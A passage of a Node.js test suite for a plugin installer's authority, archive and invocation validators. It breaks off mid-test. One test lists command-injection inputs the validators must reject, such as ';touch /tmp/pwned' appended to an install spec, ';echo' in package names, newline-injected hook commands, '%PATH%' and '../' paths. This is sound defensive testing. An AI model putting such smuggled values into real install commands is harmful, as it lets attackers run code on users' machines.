import assert from 'node:assert/strict';
import { createHash, randomBytes } from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import {
  chmod,
  link,
  lstat,
  mkdir,
  mkdtemp,
  open,
  readdir,
  readFile,
  realpath,
  rename,
  rm,
  writeFile,
} from 'node:fs/promises';
import { once } from 'node:events';
import { tmpdir } from 'node:os';
import { delimiter, join, relative } from 'node:path';
import test from 'node:test';
import { gzipSync } from 'node:zlib';

import {
  loadAuthority,
  loadSchema,
  lifecycleHooksFromManifest,
  lifecycleHooksSha256,
  manifestHasRuntimeDependencyGraph,
  resolveItems,
  validateAuthority,
  validateItem,
} from '../skills/dsh-plugin-installer/scripts/authority.mjs';
import {
  inspectTarEntries,
  validateHostedArtifact,
  validateUpstreamArtifact,
} from '../skills/dsh-plugin-installer/scripts/archive-policy.mjs';
import {
  acquireTransactionLock,
  assertPrivateRecoveryPlatform,
  bindRecoverySourceToAuthority,
  buildBoundPnpmResolutionInvocation,
  buildChildEnvironment,
  buildDshInvocation,
  buildPlan,
  buildPrivateRecoveryBinding,
  buildRecoveryAuthentication,
  buildRecoveryPlan,
  buildRemovalPlan,
  canReleaseTransactionLockAfterError,
  executeRecoveryTransaction,
  executeRemovalTransaction,
  executeTransaction,
  loadRecoveryKey,
  loadRecoverySource,
  parseDumpConfigEntries,
  parsePluginInventory,
  preflightPrepared,
  publicTerminalState,
  releaseTransactionLock,
  runAtomicAcceptanceBoundary,
  validateInterruptedRecoveryLock,
  verifyFrozenLockfileBytes,
  verifyTerminalManagedFilesBinding,
  verifyTerminalSnapshotManagedFilesBinding,
  verifyRuntimeAcceptanceEvidence,
} from '../skills/dsh-plugin-installer/scripts/install-transaction.mjs';
import {
  authorizePrepareText,
  cleanupInstallerOwnedAllowBuilds,
  cleanupInstallerOwnedAllowBuildsText,
  revokePrepareText,
  resolvePnpmLifecyclePolicy,
  validateProfileResolutionSurface,
  verifyEffectivePnpmBuildPolicy,
} from '../skills/dsh-plugin-installer/scripts/prepare-authorization.mjs';
import {
  captureProfileClosure,
  verifyProfileClosure,
} from '../skills/dsh-plugin-installer/scripts/profile-closure.mjs';
import {
  atomicRestoreWrite,
  captureManagedFileBindingInput,
  captureSnapshotManagedFileBindingInput,
  createProfileSnapshot,
  loadVerifiedProfileSnapshot,
  restoreProfileSnapshot,
  verifyProfileSnapshot,
} from '../skills/dsh-plugin-installer/scripts/profile-snapshot.mjs';
import {
  prepareHosted,
  prepareUpstream,
  validatePrepared,
} from '../skills/dsh-plugin-installer/scripts/prepare-plugin.mjs';
import {
  createPrivatePnpmBinding,
  pnpmCommandShimShell,
  requiresPnpmCommandShimShell,
  validatePrivatePnpmPathext,
} from '../skills/dsh-plugin-installer/scripts/pnpm-binding.mjs';
import {
  loadPnpmRuntimeAuthority,
  pnpmRuntimeClosureSha512,
  validatePnpmRuntimeArtifact,
  validatePnpmRuntimeAuthority,
} from '../skills/dsh-plugin-installer/scripts/pnpm-runtime.mjs';
import {
  itemAuthoritySha256,
  loadTop10Schema,
  releaseSetPayloadSha256,
  validateTop10ReleaseSet,
} from '../skills/dsh-plugin-installer/scripts/top10-authority.mjs';
import {
  captureWindowsPrivatePathIdentity,
  secureWindowsPrivatePath,
  secureWindowsPrivatePaths,
  trustedWindowsSystemRoot,
  trustedWindowsSystemRootFromCandidates,
  WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT,
  WINDOWS_PRIVATE_ACL_TIMEOUT_MS,
} from '../skills/dsh-plugin-installer/scripts/windows-private-acl.mjs';
import {
  WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
  windowsPowerShellTempParentFromEnvironment,
} from '../skills/dsh-plugin-installer/scripts/windows-powershell-temp.mjs';

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function stable(value) {
  if (Array.isArray(value)) return value.map(stable);
  if (value !== null && typeof value === 'object') {
    return Object.fromEntries(Object.keys(value).sort().map((key) => [key, stable(value[key])]));
  }
  return value;
}

function integrity(digest) {
  return `sha256-${Buffer.from(digest, 'hex').toString('base64')}`;
}

function sha512Integrity(bytes) {
  return `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
}

function tar(entries, { compress = true } = {}) {
  const blocks = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body ?? '');
    const header = Buffer.alloc(512);
    header.write(entry.name, 0, 'utf8');
    const writeOctal = (value, offset, length) => {
      header.write(`${value.toString(8).padStart(length - 1, '0')}\0`, offset, 'ascii');
    };
    writeOctal(entry.mode ?? 0o644, 100, 8);
    writeOctal(0, 108, 8);
    writeOctal(0, 116, 8);
    writeOctal(body.length, 124, 12);
    writeOctal(0, 136, 12);
    header.fill(0x20, 148, 156);
    header[156] = (entry.type ?? '0').charCodeAt(0);
    header.write('ustar\0', 257, 'ascii');
    header.write('00', 263, 'ascii');
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(`${checksum.toString(8).padStart(6, '0')}\0 `, 148, 'ascii');
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  const bytes = Buffer.concat(blocks);
  return compress ? gzipSync(bytes, { level: 9, mtime: 0 }) : bytes;
}

function refreshTarHeaderChecksum(bytes, offset = 0) {
  bytes.fill(0x20, offset + 148, offset + 156);
  let checksum = 0;
  for (let index = offset; index < offset + 512; index += 1) checksum += bytes[index];
  bytes.write(`${checksum.toString(8).padStart(6, '0')}\0 `, offset + 148, 8, 'ascii');
  return bytes;
}

function lifecycle(scripts = {}) {
  const hooks = lifecycleHooksFromManifest({ scripts });
  return {
    hooks,
    hooksSha256: lifecycleHooksSha256(hooks),
    transitiveDependencyRisk: 'pnpm-may-run-transitive-dependency-lifecycle-scripts',
  };
}

function runtimeAcceptance(id, name, version) {
  return {
    schemaVersion: 1,
    dumpConfig: {
      kind: 'exact-cordis-entry',
      entryId: `fixture-${id}`,
      packageName: name,
      occurrence: 'exactly-one',
    },
    functionalProbe: {
      kind: 'cold-web-start-with-plugin-inventory',
      packageName: name,
      version,
      unauthenticatedRootStatus: 401,
    },
  };
}

function hostedFixture({ id = 3006, slug = 'fixture-hosted', name = 'dsh-fixture-hosted' } = {}) {
  const version = '1.0.0';
  const bundlePatch = 'cordis.patch.yml';
  const license = Buffer.from('MIT License\n');
  const notice = Buffer.from(
    `# Modification notice\n\nHosted adaptation of ${name}@${version}.\n\n- License: MIT\n`
  );
  const manifest = Buffer.from(`${JSON.stringify({
    name,
    version,
    license: 'MIT',
    dsh: { bundle: { patch: bundlePatch } },
  })}\n`);
  const manifestSha256 = sha256(manifest);
  const bomRef = `pkg:npm/${name.startsWith('@') ? `%40${name.slice(1)}` : name}@${version}`;
  const component = {
    type: 'library',
    name,
    version,
    purl: bomRef,
    'bom-ref': bomRef,
    licenses: [{ expression: 'MIT' }],
    properties: [{
      name: 'dsh-themes:package-manifest-sha256',
      value: manifestSha256,
    }],
  };
  const sbom = Buffer.from(`${JSON.stringify({
    bomFormat: 'CycloneDX',
    specVersion: '1.6',
    version: 1,
    metadata: { component },
    components: [],
    dependencies: [{ ref: bomRef, dependsOn: [] }],
  })}\n`);
  const bytes = tar([
    {
      name: 'package/package.json',
      body: manifest,
    },
    { name: `package/${bundlePatch}`, body: '[]\n' },
    { name: 'package/LICENSE', body: license },
    { name: 'package/NOTICE.md', body: notice },
    { name: 'package/SBOM.cdx.json', body: sbom },
  ]);
  const digest = sha256(bytes);
  return {
    bytes,
    item: {
      catalogId: id,
      slug,
      title: `Fixture ${id}`,
      status: 'verified-installable',
      profile: 'web',
      distribution: {
        kind: 'hosted-plugin-verified',
        assetName: `${slug}-${version}.tgz`,
        artifactUrl: `https://github.com/LvvUP/dsh-themes-skills/releases/download/v0.8.0/${slug}-${version}.tgz`,
        artifactBytes: bytes.length,
        artifactSha256: digest,
        artifactIntegrity: integrity(digest),
        manifestSha256,
        licenseFile: { path: 'LICENSE', sha256: sha256(license) },
        noticeFile: { path: 'NOTICE.md', sha256: sha256(notice) },
        sbom: {
          format: 'cyclonedx-json',
          path: 'SBOM.cdx.json',
          sha256: sha256(sbom),
        },
      },
      package: {
        name,
        version,
        bundlePatch,
        lifecycleAuthorization: {
          required: false,
          packageKey: null,
          authorizedHooks: [],
          hooksSha256: null,
        },
        lifecycle: lifecycle(),
      },
      safety: {
        consentRequired: true,
        permissions: ['Reads the active workspace after user approval.'],
        network: [],
        processes: [],
        files: ['Writes only its DSH profile package state.'],
      },
      rights: {
        licenseExpression: 'MIT',
        sourceUrl: 'https://github.com/example/plugin',
        redistribution: 'allowed',
      },
      rollback: { removePackageName: name, coldRestartRequired: true },
      runtimeAcceptance: runtimeAcceptance(id, name, version),
      receipts: {
        status: 'verified',
        runtimeReceiptSha256: 'a'.repeat(64),
        platformNodeMatrixSha256: 'b'.repeat(64),
      },
    },
  };
}

function upstreamBase({ id, slug, name, version, source, scripts = {} }) {
  const packageLifecycle = lifecycle(scripts);
  const authorizedHooks = Object.keys(packageLifecycle.hooks)
    .filter((hook) => packageLifecycle.hooks[hook] !== null);
  return {
    catalogId: id,
    slug,
    title: `Fixture ${slug}`,
    status: 'verified-installable',
    profile: 'web',
    distribution: {
      kind: 'upstream-plugin-verified',
      source,
    },
    package: {
      name,
      version,
      bundlePatch: 'cordis.patch.yml',
      lifecycle: packageLifecycle,
      lifecycleAuthorization: {
        required: authorizedHooks.length > 0,
        packageKey: authorizedHooks.length > 0 ? name : null,
        authorizedHooks,
        hooksSha256: authorizedHooks.length > 0 ? packageLifecycle.hooksSha256 : null,
      },
    },
    safety: {
      consentRequired: true,
      permissions: ['Runs reviewed workspace tools.'],
      network: ['Connects only to api.example.test.'],
      processes: ['Runs its exact prepare build after consent.'],
      files: ['Writes generated lib files during prepare.'],
    },
    rights: {
      licenseExpression: 'Apache-2.0',
      sourceUrl: 'https://github.com/example/plugin',
      redistribution: 'upstream-only',
    },
    rollback: {
      removePackageName: name,
      coldRestartRequired: true,
    },
    runtimeAcceptance: runtimeAcceptance(id, name, version),
    receipts: {
      status: 'verified',
      runtimeReceiptSha256: 'f'.repeat(64),
      platformNodeMatrixSha256: '1'.repeat(64),
    },
  };
}

function gitFixture() {
  const commit = 'c'.repeat(40);
  const repository = 'https://github.com/example/plugin.git';
  return upstreamBase({
    id: 3052,
    slug: 'fixture-git-upstream',
    name: '@example/dsh-plugin',
    version: '1.2.3',
    scripts: {
      prepare: 'pnpm run build',
      install: 'node install.js',
      postinstall: 'node postinstall.js',
    },
    source: {
      type: 'git-commit',
      repository,
      commit,
      tree: 'd'.repeat(40),
      subdir: '.',
      installSpec: `git+${repository}#${commit}`,
      manifestSha256: 'e'.repeat(64),
      lockfilePath: 'pnpm-lock.yaml',
      lockfileSha256: '2'.repeat(64),
    },
  });
}

function resolvedLifecyclePolicy(items, extraDenied = []) {
  const directKeys = items.map((item) => ({
    catalogId: item.catalogId,
    packageName: item.package.name,
    policyKey: `${item.package.name}@file:../../prepared/${item.catalogId}.tgz`,
    snapshotKey: `${item.package.name}@file:../../prepared/${item.catalogId}.tgz`,
  })).sort((left, right) => left.catalogId - right.catalogId);
  const authorizedKeys = directKeys
    .filter((entry) => items.find((item) => item.catalogId === entry.catalogId)
      .package.lifecycleAuthorization.required)
    .map((entry) => entry.policyKey)
    .sort();
  const deniedKeys = [...new Set([
    ...extraDenied,
    ...directKeys
      .filter((entry) => !authorizedKeys.includes(entry.policyKey))
      .map((entry) => entry.policyKey),
  ])].sort();
  return { schemaVersion: 2, directKeys, authorizedKeys, deniedKeys };
}

function locklessGitFixture() {
  const commit = 'a'.repeat(40);
  const repository = 'https://github.com/example/prebuilt-plugin.git';
  return upstreamBase({
    id: 3005,
    slug: 'fixture-lockless-git-upstream',
    name: '@example/prebuilt-plugin',
    version: '1.0.1',
    scripts: {},
    source: {
      type: 'git-commit',
      repository,
      commit,
      tree: 'b'.repeat(40),
      subdir: '.',
      installSpec: `git+${repository}#${commit}`,
      manifestSha256: '3'.repeat(64),
      lockfilePath: null,
      lockfileSha256: null,
    },
  });
}

function upstreamArtifactFixture({ type = 'npm-package-version' } = {}) {
  const id = type === 'npm-package-version' ? 3041 : 3033;
  const slug = type === 'npm-package-version' ? 'fixture-npm-upstream' : 'fixture-release-upstream';
  const name = type === 'npm-package-version' ? '@example/npm-plugin' : '@example/release-plugin';
  const version = '2.3.4';
  const scripts = { postinstall: 'node postinstall.js' };
  const manifestBytes = Buffer.from(`${JSON.stringify({
    name,
    version,
    scripts,
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  })}\n`);
  const bytes = tar([
    { name: 'package/package.json', body: manifestBytes },
    { name: 'package/cordis.patch.yml', body: '[]\n' },
  ]);
  let source;
  let metadataBytes = null;
  if (type === 'npm-package-version') {
    const tarballUrl = 'https://registry.npmjs.org/@example/npm-plugin/-/npm-plugin-2.3.4.tgz';
    const distIntegrity = sha512Integrity(bytes);
    metadataBytes = Buffer.from(`${JSON.stringify({
      name,
      versions: {
        [version]: { name, version, dist: { tarball: tarballUrl, integrity: distIntegrity } },
      },
    })}\n`);
    source = {
      type,
      registry: 'https://registry.npmjs.org',
      packageName: name,
      version,
      installSpec: `${name}@${version}`,
      metadataSha256: sha256(metadataBytes),
      tarballUrl,
      tarballBytes: bytes.length,
      tarballSha256: sha256(bytes),
      distIntegrity,
    };
  } else {
    source = {
      type,
      repository: 'https://github.com/example/plugin',
      tag: 'v2.3.4',
      assetName: 'release-plugin-2.3.4.tgz',
      assetUrl: 'https://github.com/example/plugin/releases/download/v2.3.4/release-plugin-2.3.4.tgz',
      assetBytes: bytes.length,
      assetSha256: sha256(bytes),
      assetIntegrity: integrity(sha256(bytes)),
      manifestSha256: sha256(manifestBytes),
    };
  }
  return {
    bytes,
    metadataBytes,
    item: upstreamBase({ id, slug, name, version, source, scripts }),
  };
}

function validationOptions(loaded) {
  return {
    harnessAuthorityBytes: loaded.harnessAuthorityBytes,
    top10ReleaseSetBytes: loaded.top10ReleaseSetBytes,
    migrationMapBytes: loaded.migrationMapBytes,
    migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
    candidateIntakeBytes: loaded.candidateIntakeBytes,
  };
}

function promotedContext(loaded, items) {
  const authority = structuredClone(loaded.authority);
  authority.harness.runtimeStatus = 'runtime-receipt-verified';
  authority.harness.runtimeReceiptSetSha256 = '9'.repeat(64);
  authority.harness.installable = true;
  authority.publication.status = 'verified-installable';
  authority.publication.publishedInstallable = true;
  authority.publication.verifiedInstallableCount = 80;
  authority.publication.authorityItemCount = 80;
  authority.items = items;
  const releaseSet = structuredClone(loaded.top10ReleaseSet);
  releaseSet.status = 'verified-frozen';
  releaseSet.frozen = true;
  releaseSet.scoring.coverageStatus = 'verified';
  const top10Ids = [3006, 3052, 3041, 3033, 3040, 3044, 3036, 3010, 3038, 3045];
  const useCases = [
    'automation',
    'communication',
    'data-and-analysis',
    'developer-workflow',
    'files-and-content',
    'knowledge-retrieval',
    'observability',
    'productivity',
  ];
  releaseSet.entries = top10Ids.map((catalogId, index) => {
    const item = items.find((candidate) => candidate.catalogId === catalogId);
    const scores = {
      userValueAndUseCaseClarity: 25,
      stabilityMaintenanceAndAlpha2Fit: 25,
      securityAndPermissionRestraint: 15,
      crossPlatformInstallRemoveRollback: 15,
      nonTechnicalUsabilityAndDocs: 10,
      combinationComplementarity: 10 - index,
    };
    return {
      rank: index + 1,
      publicId: `#${catalogId}`,
      catalogId,
      itemAuthoritySha256: itemAuthoritySha256(item),
      useCaseCategories: [useCases[index % useCases.length]],
      scores,
      totalScore: Object.values(scores).reduce((sum, score) => sum + score, 0),
      maintenanceActivityAt: '2026-08-30',
      maintenanceActivityReceiptSha256: sha256(Buffer.from(`maintenance-${catalogId}`)),
    };
  });
  releaseSet.scoring.coveredUseCaseCategories = [...new Set(
    releaseSet.entries.flatMap((entry) => entry.useCaseCategories)
  )].sort();
  releaseSet.gate = {
    requiredPublishedPluginCount: 80,
    verifiedPluginCount: 80,
    requiredMatrixTasksPerItem: 6,
    verifiedMatrixTasksPerItem: 6,
    itemAuthorityComplete: true,
    allEightyVerified: true,
    sixTaskMatrixVerified: true,
    transactionPreflightVerified: true,
    transactionRollbackVerified: true,
    webCoexistenceVerified: true,
    conflictMatrixVerified: true,
    transactionPreflightReceiptSha256: '6'.repeat(64),
    transactionRollbackReceiptSha256: '7'.repeat(64),
    webCoexistenceReceiptSha256: '8'.repeat(64),
    conflictMatrixReceiptSha256: '5'.repeat(64),
    itemAuthoritySetSha256: sha256(Buffer.from(`${JSON.stringify(releaseSet.entries.map((entry) => ({
      catalogId: entry.catalogId,
      itemAuthoritySha256: entry.itemAuthoritySha256,
    })))}\n`)),
    platformNodeMatrixSetSha256: sha256(Buffer.from(`${JSON.stringify(releaseSet.entries.map((entry) => ({
      catalogId: entry.catalogId,
      platformNodeMatrixSha256: items.find((item) => item.catalogId === entry.catalogId).receipts.platformNodeMatrixSha256,
    })))}\n`)),
  };
  releaseSet.releaseSetPayloadSha256 = releaseSetPayloadSha256(releaseSet);
  const top10ReleaseSetBytes = Buffer.from(`${JSON.stringify(releaseSet, null, 2)}\n`);
  authority.top10ReleaseSet.sha256 = sha256(top10ReleaseSetBytes);
  return {
    authority,
    top10ReleaseSet: releaseSet,
    top10ReleaseSetBytes,
    validationOptions: {
      harnessAuthorityBytes: loaded.harnessAuthorityBytes,
      top10ReleaseSetBytes,
      migrationMapBytes: loaded.migrationMapBytes,
      migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
      candidateIntakeBytes: loaded.candidateIntakeBytes,
    },
  };
}

function fullItemSet(overrides = []) {
  const byId = new Map(overrides.map((item) => [item.catalogId, item]));
  return Array.from({ length: 80 }, (_, offset) => {
    const id = 3000 + offset;
    return byId.get(id) ?? hostedFixture({
      id,
      slug: `fixture-${id}`,
      name: `dsh-fixture-${id}`,
    }).item;
  });
}

async function workspace(t) {
  const root = await mkdtemp(join(tmpdir(), 'dsh-plugin-installer-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  return root;
}

function completeRollback() {
  return {
    attempted: true,
    filesRestored: true,
    closureRestored: true,
    inventoryRestored: true,
    coldStartProbePassed: true,
  };
}

test('current Plugin authority exposes 80 curated records but zero installation authority', async () => {
  const loaded = await loadAuthority();
  assert.equal(
    loaded.authoritySha256,
    '413e4874d8ee8ac6915bbead4c82d37174b3170e3a90c38c0a507f6cb1382f26'
  );
  assert.equal(loaded.authority.migrationReview.retainedCurrentCatalogCount, 52);
  assert.equal(loaded.authority.migrationReview.retiredCatalogCount, 28);
  assert.equal(loaded.authority.migrationReview.replacementCandidateCount, 44);
  assert.equal(loaded.authority.migrationReview.replacementIdsAllocated, false);
  const changedMigrationBytes = Buffer.from(loaded.migrationMapBytes);
  changedMigrationBytes[changedMigrationBytes.length - 2] =
    changedMigrationBytes[changedMigrationBytes.length - 2] === 0x20 ? 0x09 : 0x20;
  assert.throws(
    () => validateAuthority(loaded.authority, {
      ...validationOptions(loaded),
      migrationMapBytes: changedMigrationBytes,
    }),
    /exact alpha\.2 migration review bytes/
  );
  assert.equal(loaded.authority.publication.publishedCatalogPluginCount, 80);
  assert.equal(loaded.authority.publication.requiredVerifiedInstallableCount, 80);
  assert.equal(loaded.authority.publication.verifiedInstallableCount, 0);
  assert.equal(loaded.authority.items.length, 0);
  assert.equal(loaded.authority.harness.installable, false);
  assert.equal(loaded.top10ReleaseSet.frozen, false);
  assert.equal(loaded.top10ReleaseSet.status, 'candidate-pending');
  assert.equal(loaded.top10ReleaseSet.gate.verifiedPluginCount, 0);
  assert.equal(loaded.top10ReleaseSet.gate.verifiedMatrixTasksPerItem, 0);
  assert.deepEqual(loaded.top10ReleaseSet.entries, []);
  assert.throws(
    () => resolveItems(loaded.authority, ['#3006'], {
      top10ReleaseSet: loaded.top10ReleaseSet,
      validationOptions: validationOptions(loaded),
    }),
    /evidence-pending/
  );
});

test('independent Top10 authority freezes scoring but fails closed until 80/80 six-task evidence', async () => {
  const loaded = await loadAuthority();
  assert.equal(validateTop10ReleaseSet(loaded.top10ReleaseSet).frozen, false);
  assert.deepEqual(Object.values(loaded.top10ReleaseSet.scoring.weights), [25, 25, 15, 15, 10, 10]);
  assert.deepEqual(loaded.top10ReleaseSet.scoring.coveredUseCaseCategories, []);
  assert.deepEqual(
    loaded.top10ReleaseSet.scoring.tieBreakOrder,
    ['stability-plus-security', 'maintenance-activity', 'lower-public-id']
  );
  assert.deepEqual(loaded.top10ReleaseSet.entries, []);

  const promoted = promotedContext(loaded, fullItemSet());
  assert.doesNotThrow(() => validateTop10ReleaseSet(promoted.top10ReleaseSet, {
    authority: promoted.authority,
  }));
  const tamperedOrder = structuredClone(promoted.top10ReleaseSet);
  [tamperedOrder.entries[0], tamperedOrder.entries[1]] = [tamperedOrder.entries[1], tamperedOrder.entries[0]];
  assert.throws(() => validateTop10ReleaseSet(tamperedOrder), /identity|rank|payload digest/);
  const premature = structuredClone(loaded.top10ReleaseSet);
  premature.frozen = true;
  premature.status = 'verified-frozen';
  premature.releaseSetPayloadSha256 = releaseSetPayloadSha256(premature);
  assert.throws(
    () => validateTop10ReleaseSet(premature, { authority: loaded.authority }),
    /80\/80 six-task gate/
  );
  const changedBytes = Buffer.from(loaded.top10ReleaseSetBytes);
  changedBytes[changedBytes.length - 2] = changedBytes[changedBytes.length - 2] === 0x20 ? 0x09 : 0x20;
  assert.throws(
    () => validateAuthority(loaded.authority, {
      harnessAuthorityBytes: loaded.harnessAuthorityBytes,
      top10ReleaseSetBytes: changedBytes,
      migrationMapBytes: loaded.migrationMapBytes,
      migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
      candidateIntakeBytes: loaded.candidateIntakeBytes,
    }),
    /exact Top10 release-set bytes/
  );
});

test('machine schema is closed and models hosted plus fixed upstream distributions', async () => {
  const schema = await loadSchema();
  const top10Schema = await loadTop10Schema();
  assert.equal(schema.additionalProperties, false);
  assert.equal(top10Schema.additionalProperties, false);
  assert.equal(schema.$defs.item.additionalProperties, false);
  assert.equal(schema.$defs.hostedDistribution.additionalProperties, false);
  assert.equal(schema.$defs.upstreamDistribution.additionalProperties, false);
  assert.equal(schema.$defs.lifecycleHooks.additionalProperties, false);
  assert.deepEqual(
    schema.properties.supportedDistributionKinds.const,
    ['hosted-plugin-verified', 'upstream-plugin-verified']
  );
  assert.equal(schema.$defs.item.properties.distribution.oneOf.length, 2);
  assert.equal(schema.$defs.upstreamDistribution.properties.source.oneOf.length, 3);
  assert.equal(schema.$defs.gitCommitSource.properties.subdir.const, '.');
  assert.equal(schema.$defs.gitCommitSource.oneOf.length, 2);
  assert.equal(schema.$defs.publication.properties.publishedCatalogPluginCount.const, 80);
  assert.equal(schema.$defs.migrationReview.properties.retainedCurrentCatalogCount.const, 52);
  assert.equal(schema.$defs.migrationReview.properties.retiredCatalogCount.const, 28);
  assert.equal(schema.$defs.migrationReview.properties.replacementCandidateCount.const, 44);
  assert.equal(schema.$defs.migrationReview.properties.replacementIdsAllocated.const, false);
  assert.equal(schema.$defs.hostedDistribution.properties.sbom.additionalProperties, false);
  assert.equal(top10Schema.$defs.weights.properties.userValueAndUseCaseClarity.const, 25);
  assert.equal(top10Schema.$defs.weights.properties.stabilityMaintenanceAndAlpha2Fit.const, 25);
  assert.equal(top10Schema.$defs.scoring.properties.minimumUseCaseCategories.const, 8);
});

test('authority validator accepts exact hosted/upstream records and rejects command injection', async () => {
  const loaded = await loadAuthority();
  const hosted = hostedFixture().item;
  const git = gitFixture();
  const locklessGit = locklessGitFixture();
  const npm = upstreamArtifactFixture().item;
  const release = upstreamArtifactFixture({ type: 'github-release-asset' }).item;
  const promoted = promotedContext(loaded, fullItemSet([hosted, git, locklessGit, npm, release]));
  assert.doesNotThrow(() => validateAuthority(promoted.authority, promoted.validationOptions));
  const partial = structuredClone(promoted.authority);
  partial.items = [hosted, git];
  partial.publication.verifiedInstallableCount = 2;
  partial.publication.authorityItemCount = 2;
  assert.throws(() => validateAuthority(partial, promoted.validationOptions), /80|publication gate/i);

  const attacks = [
    (item) => { item.distribution.source.installSpec += ';touch /tmp/pwned'; },
    (item) => { item.distribution.source.repository = 'https://github.com/example/plugin.git?token=secret'; },
    (item) => { item.package.name = '@example/plugin;echo'; },
    (item) => { item.package.name = '@-example/plugin'; },
    (item) => { item.package.name = '@example/-plugin'; },
    (item) => { item.package.name = '.hidden-plugin'; },
    (item) => { item.package.lifecycle.hooks.prepare += '\necho injected'; },
    (item) => { item.distribution.source.subdir = 'packages/plugin'; },
  ];
  for (const attack of attacks) {
    const changed = structuredClone(git);
    attack(changed);
    assert.throws(
      () => validateItem(changed),
      /unsafe|malformed|mismatch|path|authorization|credential-free|repository root|bounded/i
    );
  }

  for (const legacyKind of ['hosted-verified-artifact', 'upstream-source-verified']) {
    const changed = structuredClone(legacyKind.startsWith('hosted') ? hosted : git);
    changed.distribution.kind = legacyKind;
    assert.throws(() => validateItem(changed), /unsupported distribution kind/);
  }
  const npmTag = structuredClone(npm);
  npmTag.distribution.source.installSpec = `${npmTag.package.name}@latest`;
  assert.throws(() => validateItem(npmTag), /exact npm source|unsafe/i);
  const releaseLatest = structuredClone(release);
  releaseLatest.distribution.source.tag = 'latest';
  releaseLatest.distribution.source.assetUrl = releaseLatest.distribution.source.assetUrl.replace('v2.3.4', 'latest');
  assert.throws(() => validateItem(releaseLatest), /GitHub Release source/);
  const shortCommit = structuredClone(git);
  shortCommit.distribution.source.commit = 'c'.repeat(12);
  assert.throws(() => validateItem(shortCommit), /Git commit source/);
  const halfLockless = structuredClone(locklessGit);
  halfLockless.distribution.source.lockfileSha256 = '2'.repeat(64);
  assert.throws(() => validateItem(halfLockless), /Git commit source/);
  const locklessLifecycle = structuredClone(locklessGit);
  locklessLifecycle.package.lifecycle.hooks.prepare = 'node build.js';
  locklessLifecycle.package.lifecycle.hooksSha256 = lifecycleHooksSha256(
    locklessLifecycle.package.lifecycle.hooks
  );
  locklessLifecycle.package.lifecycleAuthorization = {
    required: true,
    packageKey: locklessLifecycle.package.name,
    authorizedHooks: ['prepare'],
    hooksSha256: locklessLifecycle.package.lifecycle.hooksSha256,
  };
  assert.throws(() => validateItem(locklessLifecycle), /lockless Git source/);
  const unknownSource = structuredClone(git);
  unknownSource.distribution.source.type = 'git-branch';
  assert.throws(() => validateItem(unknownSource), /source type is unsupported/);

  const pnpmChildEnv = {
    DSH_PLUGIN_PNPM_NODE: '/absolute/node',
    DSH_PLUGIN_PNPM_CLI: '/private/pnpm-runtime/package/bin/pnpm.cjs',
  };
  const invocation = buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
    'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
    '--ignore-pnpmfile', '--', '/private/plugin-deadbeef.tgz',
  ], { expectedInstallSpec: '/private/plugin-deadbeef.tgz' });
  assert.equal(invocation.shell, false);
  assert.equal(invocation.args.at(-1), '/private/plugin-deadbeef.tgz');
  const unicodeInvocation = buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
    'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
    '--ignore-pnpmfile', '--', '/private/插件 #1 (verified).tgz',
  ], { expectedInstallSpec: '/private/插件 #1 (verified).tgz' });
  assert.equal(unicodeInvocation.args.at(-1), '/private/插件 #1 (verified).tgz');
  const windowsInvocation = buildBoundPnpmResolutionInvocation({
    DSH_PLUGIN_PNPM_NODE: 'C:\\Program Files\\nodejs\\node.exe',
    DSH_PLUGIN_PNPM_CLI: 'C:\\Private Runtime\\package\\bin\\pnpm.cjs',
  }, [
    'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
    '--ignore-pnpmfile', '--', 'C:\\Users\\Fixture User\\plugin (verified).tgz',
  ], { expectedInstallSpec: 'C:\\Users\\Fixture User\\plugin (verified).tgz' });
  assert.equal(windowsInvocation.args.at(-1), 'C:\\Users\\Fixture User\\plugin (verified).tgz');
  assert.throws(
    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
      'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
      '--ignore-pnpmfile', '--', 'C:\\Users\\unsafe%PATH%\\plugin.tgz',
    ], { expectedInstallSpec: 'C:\\Users\\unsafe%PATH%\\plugin.tgz' }),
    /command-injection-safe grammar/u
  );
  assert.throws(
    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
      'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
      '--ignore-pnpmfile', '--', '/private/../plugin.tgz',
    ], { expectedInstallSpec: '/private/../plugin.tgz' }),
    /command-injection-safe grammar/
  );
  assert.throws(
    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
      'add', '/private/plugin.tgz', '--save-exact',
    ], { expectedInstallSpec: '/private/plugin.tgz' }),
    /malformed|exact install spec/u
  );
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', ['plugin', 'bad\nargument']),
    /literal argument-array/
  );
  const list = buildDshInvocation('/absolute/dsh-bin.js', [
    'plugin', '--profile', 'web', 'list', '--json',
  ]);
  assert.equal(list.shell, false);
  const remove = buildDshInvocation('/absolute/dsh-bin.js', [
    'plugin', '--profile', 'web', 'remove', '--lockfile-only', '--',
    '@example/exact-plugin',
  ]);
  assert.equal(remove.shell, false);
  assert.equal(remove.args[5], '--lockfile-only');
  assert.equal(remove.args[6], '--');
  assert.equal(remove.args[7], '@example/exact-plugin');
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', [
      'plugin', '--profile', 'web', 'remove', '--lockfile-only', '--',
      '@example/exact-plugin;touch',
    ]),
    /fixed materialize, remove, list/u
  );
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', [
